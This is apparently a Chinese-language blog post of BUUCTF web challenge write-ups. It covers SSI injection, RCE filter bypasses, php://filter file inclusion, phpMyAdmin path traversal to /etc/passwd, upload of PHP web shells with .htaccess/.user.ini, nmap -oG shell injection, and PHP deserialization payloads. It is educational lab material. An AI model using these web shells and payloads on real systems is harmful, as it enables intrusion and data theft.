<p>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p>
<p>所以我们试一试用户名输入&lt;!–#exec cmd&#x3D;”ls ..”–&gt;</p>
<img src="/2023/08/03/buuctf/000253.png" class="">

<p>然后读flag即可</p>
<h3 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="**[极客大挑战 2019]RCE ME"></a>**[极客大挑战 2019]RCE ME</h3><p>这道题第一眼想到的是无字母数字rce异或绕过，但测试了一下发现没反应，看了其他师傅博客说过滤了system、exec、shell_exec等命令执行函数</p>
<p>这种题的操作一般是这样的，先考虑取反绕过：</p>
<p><strong>url编码取反绕过</strong> ：就是我们将php代码url取反后编码，我们传入参数后服务端进行url解码，这时由于取反后，会url解码成不可打印字符，这样我们就会绕过。</p>
<p>即，对查询语句取反，然后编码。在编码前加上~进行取反，括号没有被过滤，不用取反。</p>
<p>先构造一个Payload看看phpinfo，看一下PHP版本以及禁用函数：</p>
<pre><code>&lt;?php 
error_reporting(0);
$a=&#39;phpinfo&#39;;
$b=urlencode(~$a);
echo $b;
 ?&gt;
</code></pre>
<p>然后传入code&#x3D;(~%8F%97%8F%96%91%99%90)();</p>
<img src="/2023/08/03/buuctf/213221.png" class="">

<p>可以看到禁用了很多函数</p>
<p>我们构造一条代码来连接蚁剑</p>
<pre><code>&lt;?php 
error_reporting(0);
$a=&#39;assert&#39;;
$b=urlencode(~$a);
echo $b;
echo &quot;&lt;br&gt;&quot;;
$c=&#39;(eval($_POST[test]))&#39;;
$d=urlencode(~$c);
echo $d;
?&gt;
//%9E%8C%8C%9A%8D%8B
//%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8B%9A%8C%8B%A2%D6%D6
</code></pre>
<p>然后拼接为 <code>assert（eval($_POST[test])）</code></p>
<pre><code>?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%8B%9A%8C%8B%DD%A2%D6%D6);
</code></pre>
<p>在这里，我们不能直接使用eval 因为 eval并不是php函数 所以为我们无法通过变量函数的方法进行调用。<br>在这里，我们使用 assert 来构造，但由于php版本问题，我们并不能直接构造&lt;?php assert($_POST[‘a’]);&gt;,我们需要调用eval拼接为 assert(eval($_POST[test]))</p>
<img src="/2023/08/03/buuctf/220613.png" class="">

<p>发现一个flag文件（空的），一个readflag文件，需要执行readflag才能得到flag</p>
<img src="/2023/08/03/buuctf/221117.png" class="">

<p>1、借助蚁剑插件绕过disable_functions</p>
<img src="/2023/08/03/buuctf/223757.png" class="">























<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p>进去之后发现有个tips链接，点击链接发现是一个get传参，参数中也提示了flag.php</p>
<p>直接在get里面传参，用php:&#x2F;&#x2F;filter协议：</p>
<pre><code>?file=php://filter/convert.base64-encode/resource=flag.php
</code></pre>
<p>base64解码后果然有flag。</p>
<h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p>看源代码提示我们有个source.php，进入后看源码：</p>
<img src="/2023/08/03/buuctf/221220.png" class="">

<p>然后看到提示hint.php，访问后得到flag在ffffllllaaaagggg下，然后开始审计一波代码。</p>
<p>首先它先判定了传入的是不是空或者是不是字符串，然后进行了三次白名单判断。里面涉及到mb_substr(),mb_strpos(),urldecode()三个函数。</p>
<p>**mb_substr(str,start,length,encoding):**返回从start位置开始的长度为length的字符串。</p>
<p>**mb_strpos(str,find_str,offset,encoding):**返回str中从offset(默认为0)开始第一次出现find_str的位置。</p>
<p>根据代码分析得到，在第一次$_page取的是从0开始到第一次出现？之间的字符串，所以我们在参数中传入一个？绕过白名单。</p>
<pre><code>payload:http://03b2cc85-7af4-439b-a06e-41da80ff6505.node3.buuoj.cn/index.php?file=hint.php?../../../../../ffffllllaaaagggg 
</code></pre>
<p>tips:include函数有这么一个神奇的功能：以字符‘&#x2F;’分隔（而且不计个数），若是在前面的字符串所代表的文件无法被PHP找到，则PHP会自动包含‘&#x2F;’后面的文件——注意是最后一个‘&#x2F;’。</p>
<h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><p>这道题很皮</p>
<p>打开题目说“你想知道蒋璐源的秘密么？”，先看源码，有个Archive_room.php，进去之后又有个SECRET，点击之后跳转到新页面，显示“查阅结束没看清么？回去再仔细看看吧”，我们试试退回到上一步然后抓包，果然能抓到东西：</p>
<img src="/2023/08/03/buuctf/193820.png" class="">

<p>访问secr3t.php</p>
<img src="/2023/08/03/buuctf/194100.png" class="">

<p><strong>strstr(string <code>$haystack</code>, string <code>$needle</code>, bool <code>$before_needle</code> &#x3D; <code>false</code>): string|false</strong></p>
<p>返回 <code>haystack</code> 字符串从 <code>needle</code> 第一次出现的位置开始到 <code>haystack</code> 结尾的字符串。</p>
<p>该函数区分大小写。如果想要不区分大小写，请使用 stristr()。</p>
<p>可以看到，过滤规则很简单，而且提示的flag.php没有被过滤，那我们应该会想到flag应该不会在flag.php里，但先包含flag.php看看</p>
<img src="/2023/08/03/buuctf/194620.png" class="">

<p>没显示flag,我就在这里。。。可能flag被当作变量了,用php:&#x2F;&#x2F;filter看看</p>
<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php
</code></pre>
<p>解码后出现了flag变量</p>
<h3 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h3><p>主页上有WOOFERS和MEOWERS两个选项，点击后发现url跟着变化，猜测可能是sql注入，试了一下?category&#x3D;woofers“</p>
<img src="/2023/08/03/buuctf/174823.png" class="">

<p>有include()，原来是文件包含，但是我们还可以看到，它自动加上了.php，我们试一下让它包含flag，但是我们可以看到”Sorry, we currently only support woofers and meowers“</p>
<p>试一下?category&#x3D;woofers&#x2F;..&#x2F;flag：</p>
<p>{ % asset_img 175749.png%}</p>
<p>可以看到，flag.php应该是被包含了进去，但flag没有显示，可能是没有输出或者被注释了</p>
<p>这里我们可以套用伪协议：</p>
<pre><code>?category=php://filter/convert.base64-encode/woofers/resource=flag
</code></pre>
<h3 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h3><p>进去后一堆乱码，也没有什么提示，用dirsearch扫一下：</p>
<img src="/2023/08/03/buuctf/224819.png" class="">

<p>可以直接进去phpmyadmin：</p>
<img src="/2023/08/03/buuctf/221034.png" class="">

<p>数据库里没有东西，这里的利用点是phpmyadmin4.8.1版本存在任意文件读取漏洞：</p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/fb9c2ae16d09">https://www.jianshu.com/p/fb9c2ae16d09</a></p>
<p>payload</p>
<pre><code>target=db_datadict.php%253f/../../../../../../../../etc/passwd
</code></pre>
<img src="/2023/08/03/buuctf/191534.png" class="">

<p>尝试读取flag:</p>
<pre><code>target=db_datadict.php%253f/../../../../../../../../flag
</code></pre>
<p>成功</p>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h3><p>通过测试发现这道题检测了文件后缀，文件类型和文件内容。</p>
<p>文件后缀我们用.phtml绕过，文件类型我们修改为Content-Type：image&#x2F;jpeg，文件内容它检测到了”&lt;?”,可以用&lt;script language&#x3D;”php”&gt;eval($_POST[shell])&lt;&#x2F;script&gt;绕过，还需要加上文件头GIF89a</p>
<img src="/2023/08/03/buuctf/210543.png" class="">

<h3 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h3><p>上来就是一个前端js验证，burp抓包修改后缀：</p>
<img src="/2023/08/03/buuctf/215809.png" class="">

<p>发现response是nonono bad file，试试.phtml后缀</p>
<img src="/2023/08/03/buuctf/220018.png" class="">

<p>成功</p>
<h3 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h3><p>这道题很迷，测了很多东西都过不去，甚至最后测一张普通的图片都过不去，最后才在源代码中发现对上传内容长度有限制：$_FILES[“uploaded”][“size”] &lt; 2048。</p>
<p>那么重新按常规思路走：</p>
<p>首先修改content-Type必须为image&#x2F;jpeg才可以，然后发现后缀名也不能含有ph，</p>
<img src="/2023/08/03/buuctf/225239.png" class="">

<p>还是不行，修改一句话为&lt;script language&#x3D;”php”&gt;eval($_REQUEST[shell])&lt;&#x2F;script&gt;成功绕过。</p>
<p>既然只上传了一个jpg文件，那么还需要上传一个.htaccess</p>
<p>.htaccess的方法：</p>
<pre><code>方法一：
只将“haha.png”文件当成php文件执行
&lt;FilesMatch &quot;haha.png&quot;&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
方法二：
这里时是要包含所有文件带有haha的文件（只要文件名里面有haha都可以），都会被当成php代码执行
&lt;FilesMatch &quot;haha&quot;&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
方法三：
这种方法时，后面的.png或者.jpg文件能被当成php代码执行，如果想换成别的改扩展名就可以
AddType application/x-httpd-php .png
AddType application/x-httpd-php .jpg
</code></pre>
<p>最后可以使用蚁剑连接</p>
<h3 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h3><p>测了一下发有黑名单过滤和MIME信息过滤，那就常规操作，上传个png木马，再传个.htaccess文件，将Content-Type修改为image&#x2F;png就行。</p>
<p>要注意的是，这题用不了system等函数了，但可以用show_source()。</p>
<h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p>打开后可以看到是一个文件上传的题目，我们先上传个一句话，测试过程中发现这道题限制了文件后缀，文件头，还过滤了&lt;?，</p>
<p>所以我们需要上传一个.png的图片马，内容如下：</p>
<pre><code>GIF89a
&lt;script language=&quot;php&quot;&gt;eval($_POST[shell])&lt;/script&gt;
</code></pre>
<p>这道题测试了一下虽然可以成功上传.htaccess文件，但不能利用，可能是没有开启AllowOverride All，所以只能使用.user.ini文件（前提是含有.user.ini的文件夹下需要有正常的php文件）</p>
<pre><code>GIF89a
auto_prepend_file=haha.png
</code></pre>
<p>最后需要访问index.php</p>
<h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><img src="/2023/08/03/buuctf/182338.png" class="">

<p>这道题的重点在于这两个函数：</p>
<pre><code>escapeshellarg()
escapeshellcmd()
</code></pre>
<p>参考文章：<a target="_blank" rel="noopener" href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a></p>
<pre><code>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数
功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，
这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)

escapeshellcmd — shell 元字符转义
功能：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 
此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。
反斜线（\）会在以下字符之前插入：
&amp;#;`|\?~&lt;&gt;^()[]&#123;&#125;$\, \x0A 和 \xFF。    ’ 和 “ 仅在不配对儿的时候被转义。 
在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。
</code></pre>
<img src="/2023/08/03/buuctf/183949.png" class="">

<p>然后具体这道题的利用点在nmap这里，在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p>
<pre><code>?host=&#39; &lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php &#39;
</code></pre>
<p>注意事项：</p>
<p><strong>两边加单引号</strong>是因为，不加的话，两个函数执行后会变成：</p>
<pre><code>&#39;&lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php&#39;
</code></pre>
<p><strong>引号旁边加空格</strong>是因为，如果不加，当两个函数执行后就会生成：</p>
<pre><code>&#39;&#39;\\&#39;&#39;\&lt;\?php @eval\(\$_POST\[&quot;hack&quot;\]\)\;\?\&gt; -oG hack.php&#39;\\&#39;&#39;&#39;
</code></pre>
<p>注意：在bash中，单引号是全引用，被单引号括起的内容不管是常量还是变量都不会发生替换。所以最终就会是</p>
<pre><code>\&lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php\\
</code></pre>
<h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p>首页给出了提示，要找备份文件</p>
<p>常见的备份文件后缀名：.git .svn .swp .~ .bak .bash_history</p>
<p>用dirmap可以扫出<a target="_blank" rel="noopener" href="http://www.zip,下载下来包括以下文件index.php/">www.zip，下载下来包括以下文件index.php</a> flag.php index.js class.php style.css</p>
<p>index.php中有入口：</p>
<pre><code>include &#39;class.php&#39;;
$select = $_GET[&#39;select&#39;];
$res=unserialize(@$select);
</code></pre>
<p>很明显是php反序列化，看class.php：</p>
<pre><code>class Name&#123;
    private $username = &#39;nonono&#39;;
    private $password = &#39;yesyes&#39;;
    public function __construct($username,$password)&#123;
        $this-&gt;username = $username;
        $this-&gt;password = $password;
    &#125;
    function __wakeup()&#123;
        $this-&gt;username = &#39;guest&#39;;
    &#125;
    function __destruct()&#123;
        if ($this-&gt;password != 100) &#123;
            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;
            echo &quot;You name is: &quot;;
            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;
            echo &quot;You password is: &quot;;
            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;
            die();
        &#125;
        if ($this-&gt;username === &#39;admin&#39;) &#123;
            global $flag;
            echo $flag;
        &#125;else&#123;
            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;
            die();
        &#125;
    &#125;
&#125;
?&gt;
</code></pre>
<p>在__destruct()中，我们需要让password弱相等于100，让username等于admin才能得到flag，但是这里有个__wakeup()魔术方法，它在反序列化时先执行，我们需要绕过这个魔术方法</p>
<p><strong>这里存在一个CVE漏洞：当成员属性数目大于实际数目时可绕过__wakeup()方法</strong></p>
<p>我们先生成序列化对象：</p>
<pre><code>&lt;?php
class Name&#123;
    private $username;
    private $password;
    public function __construct()&#123;
        $this-&gt;username=&#39;admin&#39;;
        $this-&gt;password=100;
    &#125;
&#125;
echo serialize(new Name());
?&gt;
</code></pre>
<pre><code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;
</code></pre>
<p>再将成员属性数目改成3，并且在私有属性中添加上%00</p>
<pre><code>O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;
</code></pre>
<h3 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h3><p>代码审计一下发现__destruct()里的$op与2是强比较，process()函数里的是若比较，所以我们可以</p>
<p>将op实例化为数字2进行绕过，然后将filename实例化为”.&#x2F;flag.php”。</p>
<p>但是这里的变量属性是protected，序列化后会出现%00不可见字符，通过不了is_valid()函数</p>
<p><strong>绕过方法：</strong>因为php7.1以上的版本对属性类型不敏感，所以可以将属性改为public，public属性序列化不会出现不可见字符</p>
<pre><code>&lt;?php
class FileHandler
&#123;
    public $op = &quot;2&quot;;
    public $filename = &quot;./flag.php&quot;;
&#125;
echo urlencode(serialize(new FileHandler()));
</code></pre>
<pre><code>payload:O%3A11%3A%22FileHandler%22%3A2%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A10%3A%22.%2Fflag.php%22%3B%7D
</code></pre>
<p>还可以使用伪协议：</p>
<pre><code>&lt;?php
class FileHandler
&#123;
    public $op = 2;
    public $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;
&#125;
echo urlencode(serialize(new FileHandler()));
</code></pre>
<h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p>第一层绕过：</p>
<pre><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))
</code></pre>
<p>这里就要用到伪协议，php:&#x2F;&#x2F;input和data都可以</p>
<pre><code>?text=data://text/plain,welcome to the zjctf
</code></pre>
<p>然后：</p>
<pre><code>else&#123;
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    &#125;
</code></pre>
<p>意思是在useless.php中反序列化</p>
<p>这里可以用伪协议去读取useless.php:</p>
<pre><code>?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php
</code></pre>
<p>{ % asset_img 101403.png%}</p>
<p>序列化：</p>
<pre><code>&lt;?php
class Flag &#123;
    public $file=&#39;flag.php&#39;;
&#125;
echo serialize(new Flag());
</code></pre>
<p>最终payload：</p>
<pre><code>?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;
</code></pre>
<h3 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h3><p>打开后页面一直在闪，找了一下没有什么信息，抓包：</p>
<img src="/2023/08/03/buuctf/122234.png" class="">

<p>这里自动提交了两个参数func和p，猜测源码里应该有call_user_func()函数，用file_get_contents测试一下：</p>
<pre><code>func=file_get_contents&amp;p=index.php
</code></pre>
<p>输出了index.php源码：</p>
<p>{ % asset_img 122921.png%}</p>
<p>代码审计发现我们可以利用反序列化</p>
<p>序列化：</p>
<pre><code>&lt;?php
class Test&#123;
    public $p=&quot;find / -name flag*&quot;;
    public $func=&quot;system&quot;;
&#125;
echo serialize(new Test());
//O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:18:&quot;find / -name flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;
</code></pre>
<p>传参后：</p>
<img src="/2023/08/03/buuctf/132611.png" class="">

<p>读文件&#x2F;tmp&#x2F;flagoefiu4r93：</p>
<pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;
</code></pre>
<h3 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h3><pre><code>class Modifier &#123;
    protected  $var;
    public function append($value)&#123;
        include($value);
    &#125;
    public function __invoke()&#123;
        $this-&gt;append($this-&gt;var);
    &#125;
&#125;
class Show&#123;
    public $source;
    public $str;
    public function __construct($file=&#39;index.php&#39;)&#123;
        $this-&gt;source = $file;
        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;
    &#125;
    public function __toString()&#123;
        return $this-&gt;str-&gt;source;
    &#125;

    public function __wakeup()&#123;
        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;
            echo &quot;hacker&quot;;
            $this-&gt;source = &quot;index.php&quot;;
        &#125;
    &#125;
&#125;
class Test&#123;
    public $p;
    public function __construct()&#123;
        $this-&gt;p = array();
    &#125;

    public function __get($key)&#123;
        $function = $this-&gt;p;
        return $function();
    &#125;
&#125;
if(isset($_GET[&#39;pop&#39;]))&#123;
    @unserialize($_GET[&#39;pop&#39;]);
&#125;
else&#123;
    $a=new Show;
    highlight_file(__FILE__);
&#125;
</code></pre>
<p>这道题的函数调用顺序是</p>
<p><code>__wakeup()</code>-&gt;<code>__toString()</code>-&gt;<code>__get()</code>-&gt;<code>__invoke()</code>-&gt;<code>append</code>-&gt;文件包含</p>
<p>最主要的一点是调用Show类中的__wakeup()函数后要再调用一次Show类中的__tostring函数</p>
<p>payload</p>
<pre><code>&lt;?php
class Modifier&#123;
    protected $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;
&#125;
class Test&#123;
    public $p;
&#125;
class Show&#123;
    public $source;
    public $str;
&#125;
$a=new Show();
$a-&gt;source=new Show();
$a-&gt;source-&gt;str=new Test();
$a-&gt;source-&gt;str-&gt;p=new Modifier();

echo serialize($a);	
//O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot;%00*%00var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;N;&#125;
</code></pre>
<p>注意加%00</p>
<h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><pre><code>&lt;?php
$function = @$_GET[&#39;f&#39;];
function filter($img)&#123;
    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);
    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;
    return preg_replace($filter,&#39;&#39;,$img);
&#125;

if($_SESSION)&#123;
    unset($_SESSION);
&#125;
$_SESSION[&quot;user&quot;] = &#39;guest&#39;;
$_SESSION[&#39;function&#39;] = $function;
extract($_POST);
if(!$function)&#123;
    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;
&#125;
if(!$_GET[&#39;img_path&#39;])&#123;
    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);
&#125;else&#123;
    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));
&#125;
$serialize_info = filter(serialize($_SESSION));
if($function == &#39;highlight_file&#39;)&#123;
    highlight_file(&#39;index.php&#39;);
&#125;else if($function == &#39;phpinfo&#39;)&#123;
    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!
&#125;else if($function == &#39;show_image&#39;)&#123;
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));
&#125;
</code></pre>
<p>题目提示我们访问phpinfo：</p>
<img src="/2023/08/03/buuctf/222451.png" class="">

<p>应该就是让我们去dog3_f1ag.php里面去找flag</p>
<p>而这道题的难点就是这里</p>
<pre><code>if(!$_GET[&#39;img_path&#39;])&#123;
    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);
&#125;else&#123;
    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));
&#125;
</code></pre>
<p>而且最后面只进行了base64解码，所以在这段代码中我们不可能将img设为d0g3_f1ag.php</p>
<p>看了下别人wp，这又是一道反序列化字符串逃逸题，看来还是做题太少，想不起来字符串逃逸</p>
<p>代码中有个extract($_POST)，这也是我们传参的突破口</p>
<p>用extract函数对数组变量覆盖时，之前的变量会全部消失，例如：</p>
<pre><code>&lt;?php
$_SESSION[&quot;user&quot;] = &#39;guest&#39;;
$_SESSION[&#39;function&#39;] = $function;
var_dump($_SESSION);
echo &quot;&lt;br/&gt;&quot;;
extract($_POST);
var_dump($_SESSION);
//array(2) &#123; &#39;user&#39; =&gt; string(5) &quot;guest&quot; &#39;function&#39; =&gt; NULL &#125;
//&#123; &#39;flag&#39; =&gt; string(3) &quot;123&quot; &#39;user&#39; =&gt; string(5) &quot;admin&quot; &#125;
</code></pre>
<p>当我们传入SESSION[flag]&#x3D;123和SESSION[user]&#x3D;admin时，$SESSION[“user”]和$SESSION[‘function’] 全部会消失。只剩下_SESSION[flag]&#x3D;123和_SESSION[user]&#x3D;admin</p>
<p>然后就是字符串逃逸，反序列化字符串逃逸有两种方式，一种是字符串变多，一种是变少，常见的是字符串变多，而这道题是字符串变少</p>
<p>字符串逃逸又分为两种形式，键名逃逸和键值逃逸</p>
<p><strong>1、键值逃逸</strong></p>
<p>payload</p>
<pre><code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=f&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:3:&quot;dfd&quot;;s:2:&quot;fd&quot;;&#125;
//后面添加s:3:&quot;dfd&quot;;s:2:&quot;fd&quot;;是因为题目在序列化之前添加了一次img，使序列化后的属性数量变为3
</code></pre>
<p>然后题目又让我们去&#x2F;d0g3_fllllllag去找flag</p>
<pre><code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=f&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:3:&quot;dfd&quot;;s:2:&quot;fd&quot;;&#125;
</code></pre>
<p><strong>2、键名逃逸</strong></p>
<p>原理相同</p>
<pre><code>_SESSION[user]=adddd&amp;_SESSION[flagflagflag]=fddd&quot;;s:3:&quot;fdd&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;
</code></pre>
<h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h3><img src="/2023/08/03/buuctf/195713.png" class="">

<p>先传个参过去：</p>
<pre><code>?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:15:&quot;$_POST[&quot;shell&quot;]&quot;;s:1:&quot;b&quot;;s:4:&quot;eval&quot;;&#125;
</code></pre>
<p>发现会出错网页没法运行，看了其他师傅wp，这里要用assert</p>
<p>assert()可以将整个字符串参数当作php参数执行，<br>而类似的eval()函数是执行合法的php代码，eval()里的引号必须是双引号，因为单引号不能解析字符串里的变量$str，且必须以分号结尾，函数调用除外。</p>
<p>payload</p>
<pre><code>O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;
或
O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:21:&quot;eval($_POST[&quot;shell&quot;])&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;
</code></pre>
<p>并且这道题屏蔽了system</p>
<h1 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h1><h3 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h3><p>首先可以利用php伪协议绕过判断并查看题目中提示的next.php的源码</p>
<pre><code>?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php
</code></pre>
<img src="/2023/08/03/buuctf/210024.png" class="">

<p>payload:</p>
<pre><code>/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&quot;ls&quot;);
</code></pre>
<p>这里的PHP版本是：<code>5.6.40</code>，<code>preg_replace()+/e</code>存在代码执行漏洞</p>
<p>具体参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://www.xinyueseo.com/websecurity/158.html">https://www.xinyueseo.com/websecurity/158.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sipc-love/p/14289984.html">https://www.cnblogs.com/sipc-love/p/14289984.html</a></p>
<h1 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h1><h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h3><p>打开后有三个超链接：</p>
<p>{ % asset_img 173958.png %}</p>
<p>内容分别是：</p>
<pre><code>flag in /fllllllllllllag
render
md5(cookie_secret+md5(filename))
</code></pre>
